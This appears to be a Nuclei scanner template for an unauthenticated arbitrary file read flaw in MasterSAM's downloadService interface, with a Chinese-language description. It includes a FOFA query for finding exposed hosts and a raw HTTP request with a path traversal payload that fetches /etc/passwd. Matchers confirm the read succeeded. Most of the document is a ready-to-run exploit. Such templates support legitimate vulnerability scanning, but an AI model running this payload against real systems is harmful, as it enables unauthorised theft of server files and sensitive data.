id: MasterSAM-downloadService-File-reading

info:
  name: MasterSAM downloadService 任意文件读取漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: body="MasterSAM"
    MasterSAM downloadService接口存在任意文件下载漏洞，未经身份验证的攻击者可以通过该漏洞下载服务器任意文件，从而获取大量敏感信息。
  reference:
    - https://mp.weixin.qq.com/s/y6YagFvR1_ghGKO9KG__zA
  tags: File reading


http:
  - raw:
      - |
        GET /adama/adama/downloadService?type=1&file=../../../../etc/passwd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'root:'
          - '/bin/bash'
        condition: and
      - type: status
        status: 
          - 200